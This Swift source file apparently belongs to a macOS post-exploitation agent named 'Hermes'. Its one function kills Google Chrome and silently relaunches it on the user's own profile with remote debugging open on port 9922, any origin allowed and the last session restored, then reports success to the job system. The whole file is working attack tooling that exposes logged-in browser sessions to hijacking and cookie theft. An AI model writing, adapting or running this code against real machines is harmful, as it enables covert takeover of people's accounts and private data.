//
//  chrome_debug.swift
//  Hermes
//
//  Created by Matthew Trautman on 04/16/25.
//

import Foundation

func chrome_debug(job: Job) {
    let chromePath = "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
    let userDataDir = FileManager.default.homeDirectoryForCurrentUser
        .appendingPathComponent("Library/Application Support/Google/Chrome")
        .path

    let kill = Process()
    kill.executableURL = URL(fileURLWithPath: "/usr/bin/killall")
    kill.arguments = ["Google Chrome"]

    let waitTime: UInt32 = 4

    let launch = Process()
    launch.executableURL = URL(fileURLWithPath: chromePath)
    launch.arguments = [
        "--remote-debugging-port=9922",
        "--force-happiness-tracking-system",
        "--user-data-dir=\(userDataDir)",
        "--remote-allow-origins=*",
        "--restore-last-session"
    ]

    do {
        try kill.run()
        kill.waitUntilExit()
        sleep(waitTime)
        try launch.run()

        job.result = "[+] Chrome killed and relaunched with debugging enabled on port 9922."
        job.success = true
        job.completed = true
    } catch {
        job.result = "[-] Failed to launch Chrome with debugging: \(error)"
        job.success = false
        job.completed = true
        job.status = "error"
    }
}
